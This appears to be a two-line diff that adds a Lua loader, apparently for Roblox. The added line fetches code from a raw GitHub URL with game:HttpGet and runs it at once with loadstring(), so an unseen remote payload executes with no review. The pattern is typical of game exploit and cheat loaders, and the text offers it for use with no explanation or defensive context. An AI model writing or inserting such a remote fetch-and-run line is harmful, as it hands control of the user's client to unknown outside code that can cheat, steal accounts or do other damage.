@@ -1,0 +1,2 @@
+-- loader
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sown281/local/refs/heads/main/player",true))()
